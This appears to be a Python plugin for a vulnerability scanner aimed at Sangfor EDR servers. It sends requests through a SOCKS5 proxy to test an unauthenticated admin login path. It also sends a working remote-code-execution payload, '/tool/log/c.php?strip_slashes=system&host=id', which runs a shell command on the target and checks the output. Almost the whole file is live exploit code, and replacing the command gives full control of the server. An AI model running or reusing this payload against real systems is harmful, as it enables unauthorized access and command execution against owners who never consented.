from termcolor import cprint
import requests
import threading
import re
from tqdm import *
from colorama import Fore

# 全都用tqdm.write(url)打印     能够打印在进度条上方，并将进度条下移一行。
# 存在漏洞可能得需要红色，使用   tqdm.write(Fore.RED + url)   打印则有颜色
# 打印一些错误需要灰色 使用   tqdm.write(Fore.WHITE + url)
# 打印漏洞结果 使用   tqdm.write(Fore.BLACK + url)


# 模板
class Detect(threading.Thread):
    name = '深信服EDR'

    def __init__(self, url, vul_list, requests_proxies):
        threading.Thread.__init__(self)
        self.url = url
        self.vul_list = vul_list                    # 存储漏洞的名字和url
        self.proxies = requests_proxies  # 代理
        self.headers = {"User-Agent":"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.75 Safari/537.36"}
        self.isExist = False  # 检测该url是否存在漏洞，默认为False，如果测出有漏洞，则设置为True

    # 调用各种漏洞检测方法
    def run_detect(self):
        # 漏洞1
        self.webVul1()

        # 漏洞2
        self.webVul2()

        if not self.isExist:
            return False
        else:
            return True

    # 配置错误造成未授权访问
    def webVul1(self):
        url1 = self.url + '/ui/login.php?user=admin'
        tqdm.write(Fore.WHITE + 'test admin : {}'.format(url1))
        try:
            res = requests.get(url=url1, headers=self.headers, proxies=self.proxies, verify=False, allow_redirects=False)
            if res.status_code == 302:
                self.isExist = True
                tqdm.write(Fore.RED + '[深信服EDR未授权admin登陆] {}'.format(url1))
                self.vul_list.append(['深信服EDR未授权admin登陆', self.url, 'Yes {}'.format(url1)])
        except Exception as e:
            return False

    # RCE
    def webVul2(self):
        url2 = self.url + '/tool/log/c.php?strip_slashes=system&host=id'
        tqdm.write(Fore.WHITE + 'test rce : {}'.format(url2))
        try:
            res = requests.get(url=url2, headers=self.headers, proxies=self.proxies, verify=False)
            if res.status_code == 200 and 'uid=' in res.text:
                self.isExist = True
                tqdm.write(Fore.RED + "[深信服EDR RCE] {}".format(url2))
                self.vul_list.append(['深信服EDR RCE', url2, "Yes"])
        except Exception as e:
            return False

if __name__ == '__main__':
    from queue import Queue

    vul_list = []
    proxy = r'192.168.168.148:10086'
    requests_proxies = {"http": "socks5://{}".format(proxy), "https": "socks5://{}".format(proxy)}
    # requests_proxies = None
    url = r'http://www.domain.com'
    Detect(url, vul_list, requests_proxies).run_detect()

    tqdm.write(Fore.BLACK + '-' * 50 + '结果' + '-' * 50)
    for vul in vul_list:
        tqdm.write(Fore.BLACK + str(vul))
